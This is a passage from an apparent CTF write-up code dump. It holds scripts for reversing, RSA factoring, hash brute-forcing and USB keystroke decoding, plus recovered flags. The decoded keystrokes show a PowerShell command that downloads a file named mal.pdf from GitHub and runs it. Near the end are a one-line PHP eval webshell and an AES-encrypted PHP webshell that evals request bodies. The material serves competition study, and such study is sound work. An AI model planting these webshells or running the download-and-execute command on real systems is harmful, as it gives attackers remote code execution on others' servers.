0x73, 0x20, 0x68, 0x61, 0x76, 0x65, 0x20,      0x61, 0x20, 0x64, 0x61, 0x6E, 0x63, 0x69, 0x6E, 0x67, 0x7D,      0x00, 0x00, 0x66, 0x6C, 0x61, 0x67, 0x7B, 0x63, 0x61, 0x6E,      0x20, 0x75, 0x20, 0x70, 0x6C, 0x61, 0x79, 0x20, 0x74, 0x68,      0x65, 0x20, 0x70, 0x69, 0x61, 0x6E, 0x6F, 0x20, 0x66, 0x6F,      0x72, 0x20, 0x6D, 0x65, 0x7D, 0x00, 0x00, 0x00, 0x66, 0x6C,      0x61, 0x67, 0x7B, 0x69, 0x20, 0x68, 0x61, 0x76, 0x65, 0x20,      0x61, 0x20, 0x67, 0x72, 0x65, 0x61, 0x74, 0x20, 0x64, 0x72,      0x65, 0x61, 0x6D, 0x7D, 0x00, 0x00, 0x66, 0x6C, 0x61, 0x67,      0x7B, 0x69, 0x20, 0x77, 0x61, 0x6E, 0x74, 0x20, 0x67, 0x6F,      0x20, 0x74, 0x6F, 0x20, 0x74, 0x68, 0x65, 0x20, 0x53, 0x6F,      0x75, 0x74, 0x68, 0x20, 0x50, 0x6F, 0x6C, 0x65, 0x7D, 0x00,      0x00, 0x00, 0x66, 0x6C, 0x61, 0x67, 0x7B, 0x6C, 0x65, 0x74,      0x27, 0x73, 0x20, 0x68, 0x61, 0x76, 0x65, 0x20, 0x61, 0x20,      0x66, 0x69, 0x67, 0x68, 0x74, 0x7D, 0x00, 0x00, 0x00, 0x00,      0x66, 0x6C, 0x61, 0x67, 0x7B, 0x69, 0x27, 0x6D, 0x20, 0x77,      0x6F, 0x72, 0x6B, 0x69, 0x6E, 0x67, 0x20, 0x6F, 0x6E, 0x20,      0x61, 0x6E, 0x20, 0x61, 0x6E, 0x74, 0x69, 0x2D, 0x48, 0x75,      0x6C, 0x6B, 0x20, 0x61, 0x72, 0x6D, 0x6F, 0x72, 0x20, 0x7D,      0x00, 0x00, 0x00, 0x00, 0x66, 0x6C, 0x61, 0x67, 0x7B, 0x69,      0x20, 0x6B, 0x6E, 0x65, 0x77, 0x20, 0x74, 0x6F, 0x6D, 0x20,      0x77, 0x61, 0x73, 0x20, 0x67, 0x6F, 0x69, 0x6E, 0x67, 0x20,      0x74, 0x6F, 0x20, 0x61, 0x74, 0x74, 0x61, 0x63, 0x6B, 0x20,      0x6D, 0x65, 0x20, 0x74, 0x6F, 0x6E, 0x69, 0x67, 0x68, 0x74,      0x7D, 0x00, 0x66, 0x6C, 0x61, 0x67, 0x7B, 0x69, 0x27, 0x76,      0x65, 0x20, 0x61, 0x6C, 0x72, 0x65, 0x61, 0x64, 0x79, 0x20,      0x66, 0x69, 0x67, 0x75, 0x72, 0x65, 0x64, 0x20, 0x6F, 0x75,      0x74, 0x20, 0x77, 0x68, 0x61, 0x74, 0x20, 0x74, 0x6F, 0x20,      0x64, 0x6F, 0x7D, 0x00, 0x00, 0x00, 0x66, 0x6C, 0x61, 0x67,      0x7B, 0x6E, 0x6F, 0x74, 0x20, 0x64, 0x72, 0x75, 0x6E, 0x6B,      0x20, 0x6E, 0x6F, 0x20, 0x72, 0x65, 0x74, 0x75, 0x72, 0x6E,      0x7D, 0x00, 0x00, 0x00, 0x66, 0x6C, 0x61, 0x67, 0x7B, 0x6F,      0x68, 0x21, 0x21, 0x21, 0x21, 0x21, 0x21, 0x6F, 0x68, 0x7D,      0x00, 0x00, 0x00, 0x00, 0x66, 0x6C, 0x61, 0x67, 0x7B, 0x69,      0x20, 0x62, 0x65, 0x74, 0x20, 0x69, 0x74, 0x20, 0x77, 0x69,      0x6C, 0x6C, 0x20, 0x72, 0x61, 0x69, 0x6E, 0x20, 0x74, 0x6F,      0x6D, 0x6F, 0x72, 0x72, 0x6F, 0x77, 0x7D, 0x00, 0x00, 0x00,      0x66, 0x6C, 0x61, 0x67, 0x7B, 0x74, 0x6F, 0x6D, 0x20, 0x74,      0x6F, 0x6C, 0x64, 0x20, 0x6D, 0x65, 0x20, 0x74, 0x68, 0x61,      0x74, 0x20, 0x68, 0x65, 0x20, 0x77, 0x61, 0x73, 0x20, 0x61,      0x63, 0x74, 0x75, 0x61, 0x6C, 0x6C, 0x79, 0x20, 0x61, 0x20,      0x74, 0x69, 0x67, 0x65, 0x72, 0x7D, 0x00    };    unsigned char enc[] =    {      0xD3, 0x38, 0xD1, 0xD3, 0x7B, 0xAD, 0xB3, 0x66, 0x71, 0x3A,      0x59, 0x5F, 0x5F, 0x2D, 0x73    };    unsigned char ida_chars[] =    {      0xD3, 0x38, 0xD1, 0xD3, 0x7B, 0xAD, 0xB3, 0x66, 0x71, 0x3A,      0x59, 0x5F, 0x5F, 0x2D, 0x73, 0x00    };    char ff[] = "e4bdtRV02";    for (int i = 0; i < 15; i++)    {        int tp = 0;        if (i > 9) {            tp = 0;        }        else {            tp = ff[i];        }        enc[i] -= tp;        enc[i] ^= (2+ switch_ca(i % 3));    }    for (int i = 0; i < 15; i++)    {        if (i % 3 == 1)        {            int tp = i * 3;            enc[i] ^= aaa[tp];        }        enc[i] ^= 4;    }}
from pwn import *while 1:    p=process("encryptor")    p.wait_for_close()    f=open("flag.txt.enc","rb")    data=f.read()    if b"flag{" in data:        print(data)        break    f.close()    p.close()
import randomimport gmpy2
def getpq(n,e,d):    while True:        k = e * d - 1        g = random.randint(0, n)        while k%2==0:            k=k//2            temp=gmpy2.powmod(g,k,n)-1            if gmpy2.gcd(temp,n)>1 and temp!=0:                return gmpy2.gcd(temp,n)
n= 15393634704241437811571407047965218207529278849238950329420499882359515149154462592674433680412129087082275102567406550543503710118161775213536183656910892279726520148202227312448507629264239427121015706092403872586978266402316447553116208411724407465368711586887621447872002364407809592953543797319646692321612541334341183378900324146713189121105760280994702695266049904020810024990537652609099294535255399210219454610583930829883737909993183476961897889084229322415995483397484414924734020539093114397393070394929656598174957126771887906087335882580049097369036955153036983424389092042285637185882327630117320615769e= 15393634704241437811571407047965218207529278849238950329420499882359515149154462592674433680412129087082275102567406550543503710118161775213536183656910892279726520148202227312448507629264239427121015706092403872586978266402316447553116208411724407465368711586887621447872002364407809592953543797319646692321612541334341183378900324146713189121105760280994702695266049904020810024990537652609099294535255399210219454610583930829883737909993183476961897889084229322415995483397484414924734020539093114397393070394929656598174957126771887906087335882580049097369036955153036983424389092042285637185882327630117320615769d= 424184707992085368727036634979681060339188016631126395371395132791009626692092220877797321952063158959159298372653275672949543326347146732580465753892335912633332743258010037527036987474957662424735475674152462914082526658466925646224968182493094690460023505421720259663381122409147914948696061450626153526908753546708693503710352787787701648821693599138777500334149879355898444355846028142814267511986218166066642222930494985736426837825122392760739011897554697p=getpq(n,e,d)print(p)print(p.bit_length())
# 1330695105232178403308347589389568109225300408762713135772243491377491368194279861763438295639020818785204068048385359448702482999321297373194050693266305504361732774180885522917496754164772429217649860498233529377998583386464460137088587755332405498375966098268448285535036622785057248077770458222273685506367134716127451407327154608982175411015201461740953851387587296137170285694551291177618383724329150286322052759389514137701623525822579311667416001870149503
# 1536
import randomimport gmpy2
def getpq(n,e,d):    while True:        k = e * d - 1        g = random.randint(0, n)        while k%2==0:            k=k//2            temp=gmpy2.powmod(g,k,n)-1            if gmpy2.gcd(temp,n)>1 and temp!=0:                return gmpy2.gcd(temp,n)
n= 1330695105232178403308347589389568109225300408762713135772243491377491368194279861763438295639020818785204068048385359448702482999321297373194050693266305504361732774180885522917496754164772429217649860498233529377998583386464460137088587755332405498375966098268448285535036622785057248077770458222273685506367134716127451407327154608982175411015201461740953851387587296137170285694551291177618383724329150286322052759389514137701623525822579311667416001870149503e= 15393634704241437811571407047965218207529278849238950329420499882359515149154462592674433680412129087082275102567406550543503710118161775213536183656910892279726520148202227312448507629264239427121015706092403872586978266402316447553116208411724407465368711586887621447872002364407809592953543797319646692321612541334341183378900324146713189121105760280994702695266049904020810024990537652609099294535255399210219454610583930829883737909993183476961897889084229322415995483397484414924734020539093114397393070394929656598174957126771887906087335882580049097369036955153036983424389092042285637185882327630117320615769d= 424184707992085368727036634979681060339188016631126395371395132791009626692092220877797321952063158959159298372653275672949543326347146732580465753892335912633332743258010037527036987474957662424735475674152462914082526658466925646224968182493094690460023505421720259663381122409147914948696061450626153526908753546708693503710352787787701648821693599138777500334149879355898444355846028142814267511986218166066642222930494985736426837825122392760739011897554697p=getpq(n,e,d)print(p)print(p.bit_length())
# 11568115523770241283014205836742530054306019163814454744901838687283694886517929951237863476145584478470559474432242227944198744343287840651037780447792423
# 512
c2= 7090659117351297531755883438960933877263181849815568437232708639999747137583085680350909771730266998763362206865224473283130982570816918537377058225538656521223617210560656370841094169187300346437355127376920626133248983100115455529533265136725274741407727211587363755394889303944789720637515498330115070515942678821608630620272575086220037432383957991049220528177053370450234486390431027269543481157974773863005279984438957464388749795275109730696430700744950555993640720758137888948464005039907816169108829675809911658280616090368129767282407708640291466242813209343944276906740181222776418701978734705056220412984from Crypto.Util.number import *d= 424184707992085368727036634979681060339188016631126395371395132791009626692092220877797321952063158959159298372653275672949543326347146732580465753892335912633332743258010037527036987474957662424735475674152462914082526658466925646224968182493094690460023505421720259663381122409147914948696061450626153526908753546708693503710352787787701648821693599138777500334149879355898444355846028142814267511986218166066642222930494985736426837825122392760739011897554697p=11568115523770241283014205836742530054306019163814454744901838687283694886517929951237863476145584478470559474432242227944198744343287840651037780447792423pub= 15393634704241437811571407047965218207529278849238950329420499882359515149154462592674433680412129087082275102567406550543503710118161775213536183656910892279726520148202227312448507629264239427121015706092403872586978266402316447553116208411724407465368711586887621447872002364407809592953543797319646692321612541334341183378900324146713189121105760280994702695266049904020810024990537652609099294535255399210219454610583930829883737909993183476961897889084229322415995483397484414924734020539093114397393070394929656598174957126771887906087335882580049097369036955153036983424389092042285637185882327630117320615769n=pub//pm=pow(c2,d,n)m=long_to_bytes(m)from Crypto.Util.Padding import *unpadded_msg = unpad(m,190)print(bytes_to_long(unpadded_msg))
# 6691017454537973459916766225986127089265667834308461228246818094176737181286904907109719141581143793245175303466918139030005490098361730749738872021616055112021648681447925744991355487138607374460097043104612880977136184245719389209859293127922873464772879478077826669339105617364491479707870369683694600497
from Crypto.Util.number import *import gmpy2n= 87665217778729524993118310155129480311708534438704150676980835344891979982717119161254489670350577173938239682286759779547789055360697960379769693294306641200724257991678505629369338313581657539655057636732714452287023658150014746541718058750871927050204352584824130972892779877896415568548748364583880371427a0= 9362970563807702423162361787386216886594085863490420184497563324865248429693287404341206766515622648778272030443641712923250846610046357375553046092690266a1= 9362970563807702423162361745963275441706212437133735476965289880825874017106479792816846422940594285630367772490647779230476318907092613021181772527068514b0= 74836747076024432741470938222753940689278814091833170112470104078475118700897724833941621360216319460657128947837095907483b1= 93520964011413593176393772179429258741894666938448164504029535235899813670669478849381259720656022408302270582527720184427c=6691017454537973459916766225986127089265667834308461228246818094176737181286904907109719141581143793245175303466918139030005490098361730749738872021616055112021648681447925744991355487138607374460097043104612880977136184245719389209859293127922873464772879478077826669339105617364491479707870369683694600497
e=(n-pow(a0,2))//pow(b0,2)p=gmpy2.gcd(n,b1*a0-b0*a1)q=n//pd=gmpy2.invert(e,(p-1)*(q-1))m=pow(c,d,n)from Crypto.Util.number import *print(long_to_bytes(m))
# b'flag{1a100d2c0dab19c4430e7d73762b3423}'
# flag{09***********************************755ca2}import string, hashlib
from itertools import product
table = string.hexdigits[:-6]

def hash(val: str) -> str:    return hashlib.sha256(val.encode('utf-8')).hexdigest()

def doubleHash(val: str) -> str:    return hash(hash(val))

dict_4 = {}
for i in product(table, repeat=4):    i = ''.join(i)    dict_4[doubleHash(i)] = i
dict_6_head = {}dict_6_tail = {}
for i in product(table, repeat=6):    tmp = ''.join(i)    h = 'flag{09' + tmp    dict_6_head[doubleHash(h)] = h        t = tmp + '755ca2}'    dict_6_tail[doubleHash(t)] = t    a = '55cfb0b1cf88f01fc9ed2956a02f90f9014d47ad303dbb52fe7d331ddea37d88't = '41a5f7781dc69308b187e24924e0a0a337cdcc36f06b736dd99810eda7bb867b 41a5f7781dc69308b187e24924e0a0a337cdcc36f06b736dd99810eda7bb867b a64cd974e0dbd6f6a289ebd2080ffb6e8ac47f794e02cde4db2239c42f63b6ba e813a50278e41a5ea532c95f99ab616d4ec1ffabad99e1c8fde23886bb600005 8d4bd8d58ddd11cea747d874e676582bb219b065b2989d96b566f0689a3aaff5 8d4bd8d58ddd11cea747d874e676582bb219b065b2989d96b566f0689a3aaff5 e477515e963dc46294e815f9b1887541d225f4b027a7129608302ba8d07faef2 e477515e963dc46294e815f9b1887541d225f4b027a7129608302ba8d07faef2't = t.split(' ')f = [t[2],t[3],t[4]]flag = ''flag += dict_6_head[t[0]] + '-'for i in f:    flag += dict_4[i] + '-'flag += dict_6_tail[t[-1]]print(flag)
# flag{09806994-5a04-45ef-bde0-c69658755ca2}
normalKeys = {"04": "a", "05": "b", "06": "c", "07": "d", "08": "e", "09": "f", "0a": "g", "0b": "h", "0c": "i",              "0d": "j", "0e": "k", "0f": "l", "10": "m", "11": "n", "12": "o", "13": "p", "14": "q", "15": "r",              "16": "s", "17": "t", "18": "u", "19": "v", "1a": "w", "1b": "x", "1c": "y", "1d": "z", "1e": "1",              "1f": "2", "20": "3", "21": "4", "22": "5", "23": "6", "24": "7", "25": "8", "26": "9", "27": "0",              "28": "<RET>", "29": "<ESC>", "2a": "<DEL>", "2b": "t", "2c": "<SPACE>", "2d": "-", "2e": "=", "2f": "[",              "30": "]", "31": "\", "32": "<NON>", "33": ";", "34": "'", "35": "<GA>", "36": ",", "37": ".", "38": "/",              "39": "<CAP>", "3a": "<F1>", "3b": "<F2>", "3c": "<F3>", "3d": "<F4>", "3e": "<F5>", "3f": "<F6>",              "40": "<F7>", "41": "<F8>", "42": "<F9>", "43": "<F10>", "44": "<F11>", "45": "<F12>"}shiftKeys = {"04": "A", "05": "B", "06": "C", "07": "D", "08": "E", "09": "F", "0a": "G", "0b": "H", "0c": "I",             "0d": "J", "0e": "K", "0f": "L", "10": "M", "11": "N", "12": "O", "13": "P", "14": "Q", "15": "R",             "16": "S", "17": "T", "18": "U", "19": "V", "1a": "W", "1b": "X", "1c": "Y", "1d": "Z", "1e": "!",             "1f": "@", "20": "#", "21": "$", "22": "%", "23": "^", "24": "&", "25": "*", "26": "(", "27": ")",             "28": "<RET>", "29": "<ESC>", "2a": "<DEL>", "2b": "t", "2c": "<SPACE>", "2d": "_", "2e": "+", "2f": "{",             "30": "}", "31": "|", "32": "<NON>", "33": """, "34": ":", "35": "<GA>", "36": "<", "37": ">", "38": "?",             "39": "<CAP>", "3a": "<F1>", "3b": "<F2>", "3c": "<F3>", "3d": "<F4>", "3e": "<F5>", "3f": "<F6>",             "40": "<F7>", "41": "<F8>", "42": "<F9>", "43": "<F10>", "44": "<F11>", "45": "<F12>"}
out = ""path = "C:\Users\HK\Desktop\out"with open(path, "r") as f:    for line in f.readlines():        line = line.strip()        if len(line) != 0:            print(line)            try:                if line[:2] == "02":                    out += shiftKeys[line[6:8]]                elif line[:2] == "00":                    out += normalKeys[line[6:8]]            
except:                pass
print(out)>>> powershell(New-Object<SPACE>System.Net.WebClient).DownloadFile('https"//github.com/jiayuqi7813/download/releases/download/f/mal.pdf',<SPACE>'C"word.pdf')cmd<SPACE>/c<SPACE>start<SPACE>C"word.pdf
> python .bwmforpy3.py decode .test2one.png .test2theother.png .test21.png --alpha 10.0
XD8C2VOKEU
<?php eval(@$_POST['trustme']); ?>
<?php@error_reporting(0);function Decrypt($data)  {      $key="9d239b100645bd71";    $magicNum=hexdec(substr($key,0,2))%16;    $data=substr($data,0,strlen($data)-$magicNum);    return openssl_decrypt(base64_decode($data), "AES-128-ECB", $key,OPENSSL_PKCS1_PADDING);  }$post=Decrypt(file_get_contents("php://input"));eval($post);?>
ZmxhZ3sxZWM1YmU1YS1hZmJkLTQ4NjctODAwYi0zZWI3MzliOWUzYmR9Cg==
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/06/3-1686117443.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/06/10-1686117444.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/06/1-1686117444.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/06/0-1686117444.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/06/3-1686117445.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2023/06/5-1686117447.jpeg)